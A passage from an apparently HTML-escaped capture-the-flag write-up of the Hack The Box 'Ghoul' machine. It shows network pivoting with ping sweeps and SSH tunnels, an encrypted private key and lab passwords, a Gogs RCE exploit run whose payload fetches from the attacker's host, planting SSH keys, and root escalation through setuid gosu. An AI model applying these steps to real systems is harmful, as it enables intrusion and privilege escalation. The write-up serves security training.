-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;123456&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;password123&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;test@aogiri123&lt;/code&gt;. Maybe we’ll need them later. 
-&lt;br /&gt;I checked the other interfaces :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:/home/noro# ifconfig 
-eth0: flags=4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
-        inet 172.20.0.10  netmask 255.255.0.0  broadcast 172.20.255.255
-        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
-        RX packets 54427  bytes 10267568 (10.2 MB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 49877  bytes 43322005 (43.3 MB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-lo: flags=73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
-        inet 127.0.0.1  netmask 255.0.0.0
-        loop  txqueuelen 1000  (Local Loopback)
-        RX packets 467  bytes 46415 (46.4 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 467  bytes 46415 (46.4 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-root@Aogiri:/home/noro# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Aogiri&lt;/code&gt;’s ip on &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;172.20.0.10&lt;/code&gt;. We need to know what other hosts are live on that subnet so we will do a simple &lt;a href=&quot;https://en.wikipedia.org/wiki/Ping_sweep&quot;&gt;ping sweep&lt;/a&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:~# for i in {1..255}; do ping -c 1 172.20.0.$i; done | grep 'ttl='
-64 bytes from 172.20.0.1: icmp_seq=0 ttl=64 time=0.109 ms
-64 bytes from 172.20.0.10: icmp_seq=0 ttl=64 time=0.066 ms
-64 bytes from 172.20.0.150: icmp_seq=0 ttl=64 time=0.272 ms
-root@Aogiri:~# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;172.20.0.150&lt;/code&gt; we need to scan it for open ports, neither &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; nor &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; was installed so I got a &lt;a href=&quot;https://github.com/yunchih/static-binaries/blob/master/nc&quot;&gt;static version&lt;/a&gt; of &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; and uploaded it :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:/tmp# wget http://10.10.xx.xx/nc
---2019-10-04 13:05:16--  http://10.10.xx.xx/nc
-Connecting to 10.10.xx.xx:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 959800 (937K) [application/octet-stream]
-Saving to: ‘nc’
-nc                                                   100%[=====================================================================================================================&amp;gt;] 937.30K   242KB/s    in 5.3s
-2019-10-04 13:05:22 (177 KB/s) - ‘nc’ saved [959800/959800]
-root@Aogiri:/tmp# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I scanned the first 1000 ports and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; was open :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:/tmp# ./nc -zv 172.20.0.150 1-1000
-64978af526b2.Aogiri [172.20.0.150] 22 (ssh) open
-root@Aogiri:/tmp# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Assuming that &lt;code class=&quot;highlighter-rouge&quot;&gt;172.20.0.150&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;kaneki-pc&lt;/code&gt; we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;kaneki&lt;/code&gt;’s private key to ssh as &lt;code class=&quot;highlighter-rouge&quot;&gt;kaneki_pub&lt;/code&gt;. But there was a problem, the key is encrypted :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: AES-128-CBC,9E9E4E88793BC9DB54A767FC0216491F
-
-wqcYgOwX3V511WRuXWuRheYyzo5DelW+/XsBtXoL8/Ow7/Tj4EC4dKCfas39HQW8
-MNbTv51gYxQ/Vc3W1jEYSyxTCYAu600naUhX3+En7P8kje2s0I4VEZX0MJqgB/pv
-J9nPBtbXcqV6/v6Vkbc5kGtMiRVMYzS9KWiCOafveFQCr1orYmnNINsZou4AWrfB
-Ofr63sUVD8V1Rabnoltbo+pePXnQ6HqjpO1b2qCyUQBxDxwSFT5a+j5YvMYV3JXK
-HOo4D0fcMoBVT46pXga6wZtiB4XgeM/iB/xg6YfdfMPuDBJ6+fqZMjlm+GvEexkl
-EEtJAqoSG/yCOjedByVqmfKye9DaIY9Um2WkWcX1bVRlYktYtpb755aDmVVoQjb5
-CmW4yuLapjqUrGEFY+ghLLRdZvSBPZ18PbUgVMqpdmrfnEy48d22IGPJ6ZO2L4qR
-FzLjkQkjFRgkrBJ9bSzYS/NYZ8QGQh/wk3BHaupjLxD2j1Ta7PXwCjh4zBZNPO/e
-9VN9c+b/zwYSyyeKcJ8dhFEH26j5g93EnWTkdLEMyw6tRbdzhQbNo02WWDTvWPJv
-+6A+6xA6/+NxacHXfyfxQ+l8CsmpZ5CgKjKHfFeDYZHyoPhcthKkL3Go3rqZ1HOb
-MimhTR3wOUwoV/XaVcCvW+5LwPh1ljdnHCjaY2VzKns4/X+2dZtOsDz5aCovN7mM
-eHsRuIEVKtZ2EijKfYZGtDaDwTd/1YTDooGdDDdDipr8bTDvD14r07Yk/xrfjEUp
-V9+v3PzmD1trqIlFw+7D8ogFsXJ/P+raVFWaihQWEeqOnGXEhHQ0afgcVt9w62tV
-1YeVA0RwHu4S1IObji9RP1DfAMid0pCSnvAoFd/EArnAtwgPFOLqvPZj5j+LjFPL
-sOHUW+N+cY24HpH1UVTEWAkgkiGz89/bF98c1kpoLEkS2sjU+jVONTBlLeRmqcDJ
-YnCcPXrkT6oC/wctYlM141hrctWRyjY+f0IwREDCv8TM1aAAY3vaZUdMfy71Q3DE
-PO4S5ivuruwGeCQmGhEmWBSm0PwpGd0pNbHv+zs0TH+2lmAn8O3R2UrcCu0TxhmH
-oW0mQbl+2u+xVB5ijjqtm0CFLsXiX17FdCbMp1huCMTx9TuY6GMeSsN6X7exTIcx
-DEvpUHREXgtVqBdNX1QxIoMIxpK2qlMfPYtGikthba5fjBof0b/8lJvtZuoWrJ9R
-L0HWW16fkbjEXSrwdEb5zjntCxJKLWmKgiFfaoJ9/L1yhc12w/EQjpUxGkFdyeMs
-7QyGClGpKFU4GQvKMQYei57sNk/ZUPgPWizNfuuU/8qBhKXG9JB2R3GWFTEpxzO8
-luTnBEUn8Se3cLNrBQ05LIVk2jRYhUE6IBWFYvhjQUGChZTZjSlxNR55t6olYj2M
-JBxtT5E2YDhSk4nB21IlTIurggP9pNm+PtTTt2o0jzOD5uOHko6VzGz4Ukvbo0gZ
-/zyr4fR7OhGG0grtKxV1s2PpDt9bkhnMXJ+I8zZVN9INHUsoE5IXtpKKJOCQYFjQ
-v+EB7xAmWe1q9xSgLSq6I1fWJrYqjkOd9TpqVPNoyTGWM1ELYXyHah8vZi+0BFzh
------END RSA PRIVATE KEY-----
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I tried to crack the key but I couldn’t find the password in &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt;. Then I remembered &lt;code class=&quot;highlighter-rouge&quot;&gt;/secret.php&lt;/code&gt; when &lt;code class=&quot;highlighter-rouge&quot;&gt;Noro&lt;/code&gt; asked &lt;code class=&quot;highlighter-rouge&quot;&gt;Kaneki&lt;/code&gt; for access and &lt;code class=&quot;highlighter-rouge&quot;&gt;Kaneki&lt;/code&gt; replied with a weird string that looked like a password (&lt;code class=&quot;highlighter-rouge&quot;&gt;ILoveTouka&lt;/code&gt;) :
-&lt;img src=&quot;/images/hackthebox/ghoul/2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;I tried that as the key password and it worked :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# nano kaneki.key
-root@kali:~/Desktop/HTB/boxes/ghoul# chmod 600 kaneki.key 
-root@kali:~/Desktop/HTB/boxes/ghoul# ssh -i kaneki.key kaneki@ghoul.htb 
-Enter passphrase for key 'kaneki.key': 
-Last login: Fri Oct  4 11:40:26 2019 from 10.10.15.168
-kaneki@Aogiri:~$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Since I’m going to tunnel stuff I echoed my public key to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/.ssh/authorized_keys&lt;/code&gt; and I got ssh as root :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/18.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;I forwarded port 22 on &lt;code class=&quot;highlighter-rouge&quot;&gt;172.20.0.150&lt;/code&gt; then I sshed to the box as &lt;code class=&quot;highlighter-rouge&quot;&gt;kaneki_pub&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# ssh -i id_rsa -L 2020:172.20.0.150:22 root@ghoul.htb 
-Last login: Fri Oct  4 13:13:00 2019 from 10.10.xx.xx
-root@Aogiri:~# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# ssh kaneki_pub@localhost -p 2020 -i ./kaneki.key 
-Enter passphrase for key './kaneki.key': 
-Last login: Fri Oct  4 11:35:41 2019 from 172.20.0.10
-kaneki_pub@kaneki-pc:~$
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;rce-in-gogs-pivoting-from-kaneki-pc-to-git&quot;&gt;RCE in gogs, Pivoting from kaneki-pc to git&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;There was a text file called &lt;code class=&quot;highlighter-rouge&quot;&gt;to-do.txt&lt;/code&gt; in the home directory :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaneki_pub@kaneki-pc:~$ ls -la
-total 40
-drwx------ 3 kaneki_pub kaneki_pub 4096 Dec 16  2018 .
-drwxr-xr-x 1 root       root       4096 Dec 16  2018 ..
-lrwxrwxrwx 1 root       root          9 Dec 29  2018 .bash_history -&amp;gt; /dev/null
--rwx------ 1 kaneki_pub kaneki_pub  220 Dec 16  2018 .bash_logout
--rwx------ 1 kaneki_pub kaneki_pub 3771 Dec 16  2018 .bashrc
--rwx------ 1 kaneki_pub kaneki_pub  807 Dec 16  2018 .profile
-drwx------ 2 kaneki_pub kaneki_pub 4096 Dec 16  2018 .ssh
--rw------- 1 kaneki_pub kaneki_pub 3139 Dec 16  2018 .viminfo
--rw-r--r-- 1 kaneki_pub kaneki_pub  165 Dec 16  2018 .wget-hsts
--rw-r--r-- 1 root       root         44 Dec 16  2018 to-do.txt
-kaneki_pub@kaneki-pc:~$ cat to-do.txt 
-Give AogiriTest user access to Eto for git.
-kaneki_pub@kaneki-pc:~$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;On &lt;code class=&quot;highlighter-rouge&quot;&gt;Aogiri&lt;/code&gt; there was a hint about a vulnerability in &lt;code class=&quot;highlighter-rouge&quot;&gt;gogs&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:/home/kaneki# cat note.txt 
-Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;A painless self-hosted Git service. -&lt;a href=&quot;https://gogs.io/&quot;&gt;gogs.io&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;br /&gt;I checked the interfaces and there was a new subnet :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaneki_pub@kaneki-pc:~$ ifconfig 
-eth0: flags=4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
-        inet 172.20.0.150  netmask 255.255.0.0  broadcast 172.20.255.255
-        ether 02:42:ac:14:00:96  txqueuelen 0  (Ethernet)
-        RX packets 8644  bytes 924940 (924.9 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 5908  bytes 2135441 (2.1 MB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-eth1: flags=4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
-        inet 172.18.0.200  netmask 255.255.0.0  broadcast 172.18.255.255
-        ether 02:42:ac:12:00:c8  txqueuelen 0  (Ethernet)
-        RX packets 1650  bytes 2723948 (2.7 MB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 1684  bytes 352910 (352.9 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-lo: flags=73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
-        inet 127.0.0.1  netmask 255.0.0.0
-        loop  txqueuelen 1000  (Local Loopback)
-        RX packets 25  bytes 1661 (1.6 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 25  bytes 1661 (1.6 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-kaneki_pub@kaneki-pc:~$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;So I ran another ping sweep :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaneki_pub@kaneki-pc:~$ for i in {1..255}; do ping -c 1 172.18.0.$i; done | grep 'ttl='
-64 bytes from 172.18.0.1: icmp_seq=0 ttl=64 time=0.125 ms
-64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.146 ms
-64 bytes from 172.18.0.200: icmp_seq=0 ttl=64 time=0.054 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;And again I downloaded &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to scan the discovered host (&lt;code class=&quot;highlighter-rouge&quot;&gt;172.18.0.200&lt;/code&gt;) :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaneki_pub@kaneki-pc:/tmp$ wget http://172.20.0.10:8888/nc
---2019-10-04 13:37:59--  http://172.20.0.10:8888/nc
-Connecting to 172.20.0.10:8888... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 959800 (937K) [application/octet-stream]
-Saving to: ‘nc’
-nc                                                   100%[=====================================================================================================================&amp;gt;] 937.30K  --.-KB/s    in 0.006s 
-2019-10-04 13:37:59 (161 MB/s) - ‘nc’ saved [959800/959800]
-kaneki_pub@kaneki-pc:/tmp$
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaneki_pub@kaneki-pc:/tmp$ ./nc -zv 172.18.0.2 1-10000
-cuff_web_1.cuff_default [172.18.0.2] 22 (ssh) open
-cuff_web_1.cuff_default [172.18.0.2] 3000 open
-kaneki_pub@kaneki-pc:/tmp$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Port 3000 is the default port for &lt;code class=&quot;highlighter-rouge&quot;&gt;gogs&lt;/code&gt;, I forwarded it to &lt;code class=&quot;highlighter-rouge&quot;&gt;Aogori&lt;/code&gt; then from &lt;code class=&quot;highlighter-rouge&quot;&gt;Aogiri&lt;/code&gt; to my machine :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:~# ssh -L 3000:172.18.0.2:3000 -i /home/kaneki/.ssh/id_rsa kaneki_pub@172.20.0.150                                                                                                                     
-Enter passphrase for key '/home/kaneki/.ssh/id_rsa': 
-Last login: Fri Oct  4 13:38:45 2019 from 172.20.0.10
-kaneki_pub@kaneki-pc:~$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# ssh -L 3000:127.0.0.1:3000 -i kaneki.key kaneki@ghoul.htb 
-Enter passphrase for key 'kaneki.key': 
-Last login: Fri Oct  4 13:42:14 2019 from 10.10.15.168
-kaneki@Aogiri:~$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ghoul/19.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;We already have the username : &lt;code class=&quot;highlighter-rouge&quot;&gt;AogiriTest&lt;/code&gt;. I tried the password I got from &lt;code class=&quot;highlighter-rouge&quot;&gt;tomcat-users.xml&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;test@aogiri123&lt;/code&gt;) and it worked :
-&lt;img src=&quot;/images/hackthebox/ghoul/20.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/21.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;The hint said that this version of &lt;code class=&quot;highlighter-rouge&quot;&gt;gogs&lt;/code&gt; was vulnerable, so I cloned &lt;a href=&quot;https://github.com/TheZ3ro/gogsownz&quot;&gt;gogsownz&lt;/a&gt; and tried to exploit the &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; vulnerability :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# git clone https://github.com/TheZ3ro/gogsownz.git
-Cloning into 'gogsownz'...
-remote: Enumerating objects: 11, done.
-remote: Counting objects: 100% (11/11), done.
-remote: Compressing objects: 100% (11/11), done.
-remote: Total 11 (delta 2), reused 5 (delta 0), pack-reused 0
-Unpacking objects: 100% (11/11), done.
-root@kali:~/Desktop/HTB/boxes/ghoul# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul/gogsownz# python3 gogsownz.py -v  http://127.0.0.1:3000/ -C 'AogiriTest':'test@aogiri123' -n i_like_gogits --rce 'wget http://10.10.xx.xx' --cleanup
-[i] Starting Gogsownz on: http://127.0.0.1:3000
-[+] Loading Gogs homepage
-[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916 
-[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.
-[+] Performing login
-[+] Logged in sucessfully as AogiriTest
-[+] Got UserID 2
-[+] Repository created sucessfully
-[i] Exploiting authenticated PrivEsc...
-[+] Uploading admin session as repository file
-[+] Uploaded successfully.
-[+] Committing the Admin session
-[+] Committed sucessfully
-[+] Removing Repo evidences
-[+] Repo removed sucessfully
-[i] Signed in as kaneki, is admin True
-[i] Current session cookie: '638cb471cd001337'
-[+] Got UserID 1
-[+] Repository created sucessfully
-[+] Setting Git hooks
-[+] Git hooks set sucessfully
-[+] Fetching last commit...
-[+] Got last commit
-[+] Triggering the RCE with a new commit
-[+] Committed sucessfully
-[i] Performed RCE successfully
-[i] Waiting 10 seconds before cleaning up...
-[+] Removing Repo evidences
-[+] Repo removed sucessfully
-[i] Done!
-root@kali:~/Desktop/HTB/boxes/ghoul/gogsownz# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# python -m SimpleHTTPServer 80
-Serving HTTP on 0.0.0.0 port 80 ...
-10.10.10.101 - - [04/Oct/2019 16:41:19] &quot;GET / HTTP/1.1&quot; 200 -
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;It worked, time to get a reverse shell :
-&lt;img src=&quot;/images/hackthebox/ghoul/22.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;privilege-escalation-from-git-to-root-getting-aogiri-app7z&quot;&gt;Privilege Escalation from git to root, Getting aogiri-app.7z&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;Unfortunately python wasn’t installed on the host so I had to get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; for a better shell.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /home
-ls -la
-total 8
-drwxr-xr-x    1 root     root          4096 Oct  4 14:45 .
-drwxr-xr-x    1 root     root          4096 Dec 13  2018 ..
-lrwxrwxrwx    1 root     root             9 Oct  4 14:45 git -&amp;gt; /data/git
-cd git
-ls -la
-total 20
-drwxr-xr-x    4 git      git           4096 Oct  4 14:45 .
-drwxr-xr-x    5 git      git           4096 Dec 13  2018 ..
-lrwxrwxrwx    1 git      git              9 Dec 29  2018 .bash_history -&amp;gt; /dev/null
--rw-r--r--    1 git      git             71 Oct  4 14:45 .gitconfig
-drwx------    2 git      git           4096 Dec 13  2018 .ssh
-drwxr-xr-x    4 git      git           4096 Dec 13  2018 gogs-repositories
-cd .ssh
-ls -la
-total 12
-drwx------    2 git      git           4096 Dec 13  2018 .
-drwxr-xr-x    4 git      git           4096 Oct  4 14:45 ..
--rw-------    1 git      git             23 Dec 13  2018 environment
-echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@kaneki-pc&quot; &amp;gt; authorized_keys
-ls -la
-total 16
-drwx------    2 git      git           4096 Oct  4 14:52 .
-drwxr-xr-x    4 git      git           4096 Oct  4 14:45 ..
--rw-r--r--    1 git      git            398 Oct  4 14:52 authorized_keys
--rw-------    1 git      git             23 Dec 13  2018 environment
-cat authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@kaneki-pc
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaneki_pub@kaneki-pc:~$ ssh -i .ssh/id_rsa git@172.18.0.2
-Enter passphrase for key '.ssh/id_rsa': 
-Welcome to Alpine!
-
-The Alpine Wiki contains a large amount of how-to guides and general
-information about administrating Alpine systems.
-See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.
-
-You can setup the system with the command: setup-alpine
-
-You may change this message by editing /etc/motd.
-
-3713ea5e4353:~$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I couldn’t find anything useful so I had to escalate to root. After some regular enumeration I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binaries :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3713ea5e4353:~$ find / -perm -4000 2&amp;gt;/dev/null
-/usr/bin/passwd
-/usr/bin/gpasswd
-/usr/bin/chage
-/usr/bin/chfn
-/usr/bin/chsh
-/usr/bin/newgrp
-/usr/bin/expiry
-/usr/sbin/gosu
-/bin/su
-3713ea5e4353:~$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gosu&lt;/code&gt; was interesting so I checked it and found that it executes commands as other users even root, so I executed bash as root :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3713ea5e4353:~$ gosu 
-Usage: gosu user-spec command [args]
-   ie: gosu tianon bash
-       gosu nobody:root bash -c 'whoami &amp;amp;&amp;amp; id'
-       gosu 1000:1 id
-
-gosu version: 1.10 (go1.7.1 on linux/amd64; gc)
-     license: GPL-3 (full text at https://github.com/tianon/gosu)
-
-3713ea5e4353:~$ gosu root bash
-3713ea5e4353:/data/git# whoami
-root
-3713ea5e4353:/data/git# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I checked the root directory and found a bash script called &lt;code class=&quot;highlighter-rouge&quot;&gt;session.sh&lt;/code&gt; :&lt;/p&gt;
